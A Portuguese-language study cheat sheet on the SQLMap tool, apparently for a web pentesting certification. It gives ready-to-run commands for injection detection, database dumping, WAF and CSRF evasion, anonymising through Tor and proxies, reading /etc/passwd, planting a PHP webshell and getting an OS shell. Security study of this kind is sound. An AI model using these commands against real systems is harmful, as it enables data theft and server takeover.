# SQLMap (CWES)

- Sempre ir analisando os resultados e dicas do sqlmap enquanto roda.
- **Cenario comum:** acessamos um site e vemos que ele aceita input nosso via GET parameter (ex: id) → <u>www.example.com/vuln.php?id=1</u>. Checamos com sqlmap para ver se eh vulneravel → **`sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`** (**`--batch`** → usa input default em vez de termos que inserir, ex: `Y/n`)
- Para pegar o comando, podemos simplesmente ir no **Inspecionar** → **Network** → no **request** (seja GET ou POST), clicar com o botão direito e **copiar como cURL**, e depois colamos no terminal e trocamos cURL por sqlmap. Add **`--batch`** e **`--dump`**.
- Se o parametro (ex: id=1) estiver sendo enviado pelo cookie (raro): **`sqlmap 'http://83.136.252.13:56588/case3.php' --cookie='id=1*' --dump --batch`.**
- **`--level={1..5}`** → muda diretamente quais os parametros que ele vai testar (padrao sendo 1, que testa apenas GET e POST). **`--risk={1..3}` →** risco a se tomar (padrao sendo 1, sem danificar o servidor), 2 e 3 podem causar danos e modificar o BD. **OBS: praticamente so precisaremos/poderemos mudar o level.**

---

- **Enumeration**
    - Comando para descobrir algumas info importantes (banner, username, nome do BD, checar se o usuario eh admin no BD): **`--banner --current-user --current-db --is-dba`**
    - OU extrair todas as tabelas e dados do banco: **`--dump-all`**
    - Mostrar todas as tabelas e suas colunas: **`--schema`**
    
    ---
    
    - Apos conseguir o nome do BD (ex: testdb): **`--tables -D testdb`**
    - Explorar uma tabela especifica (ex: users): **`--dump -T users -D testdb`**
    - Podemos tambem pesquisar por alguma palavra especifica e especificando se eh uma coluna ou tabela que estamos buscando: **`--search -T user`**, **`--search -C pass`**
- **Bypass de Proteções Web**
    
    ### 🔐 **Anti-CSRF Token**
    
    - CSRF Tokens evitam automação forçando o uso de um token válido em requisições.
    - O SQLMap consegue lidar com isso usando:
        - `-csrf-token=nome_do_parametro`
            
            Ele identifica e atualiza automaticamente o token nos próximos envios.
            
        
        ```bash
        sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
        ```
        
    
    ---
    
    ### 🔄 **Valores Únicos Requeridos**
    
    - Algumas apps exigem valores únicos por requisição para bloquear automações.
    - Use `-randomize=param` para gerar um valor diferente automaticamente para esse parâmetro.
    
    ---
    
    ### 🧮 **Parâmetros Calculados**
    
    - Parâmetros podem depender de valores derivados de outros (ex: `h=MD5(id)`).
    - Use `-eval="código Python"` para gerar dinamicamente o valor antes do envio.
    
    ---
    
    ### 🕵️ **Esconder o IP**
    
    - Use proxy com `-proxy="socks4://ip:porta"` ou `-proxy-file=lista.txt`.
    - Para usar a rede Tor:
        - Ative com `-tor`
        - Verifique com `-check-tor`
    
    ---
    
    ### 🧱 **Detecção e Bypass de WAF (Web Application Firewall)**
    
    - SQLMap detecta WAFs automaticamente com payloads de teste.
    - Para evitar barulho: use `-skip-waf`
    - Usa a biblioteca `identYwaf` para identificar o WAF em uso.
    
    ---
    
    ### 🎭 **User-Agent Bloqueado**
    
    - Se a aplicação bloquear o user-agent do SQLMap:
        - Use `-random-agent` para simular browsers reais.
    
    ---
    
    ### 🧪 **Tamper Scripts (Evasão de Proteções)**
    
    - Scripts que alteram a sintaxe do payload para escapar de filtros.
    - Exemplo de script:
        - `between`: substitui `>` por `NOT BETWEEN 0 AND #`
    - Ex na pratica:
        - `--tamper=between`
        - Scripts são executados em ordem de prioridade.
- **OS Exploitation**
    - Para ver se temos acesso de Read/Write Files no BD, primeiramente vemos se temos privilegio DBA:
        
        ```bash
        sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
        ```
        
    
    ---
    
    - <u>**Read Files**</u>
        
        ```bash
        sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
        ```
        
        - **OBS**: ele salva o arquivo em um diretório remoto e nos mostra onde.
    
    ---
    
    - <u>**Write Files**</u>
        - Primeiro preparamos um php com Webshell no nosso terminal:
            
            ```bash
            echo '<?php system($_GET["cmd"]); ?>' > shell.php
            ```
            
        - Agora tentamos escrever esse arquivo no diretório **`/var/www/html/`** do alvo (padrão):
            
            ```bash
            sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
            ```
            
        - Se der certo ele vai retornar algo como: **`[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)`**
        - Agora simplesmente dar um cURL para rodar os comandos **(OBS: usar o `+` para indicar espaco):**
            
            ```bash
            curl http://www.example.com/shell.php?cmd=ls+-la
            ```
            
        - AGORA que conseguimos acesso a escrever arquivos, podemos tentar fazer um <u>**OS Command Execution</u>:**
            
            ```bash
            sqlmap -u "http://www.example.com/?id=1" --os-shell
            ```
            
        - Se der erro (No output) podemos tentar outra técnica padrão para esse caso(**Error-based SQL Injection**):
            
            ```bash
            sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
            ```
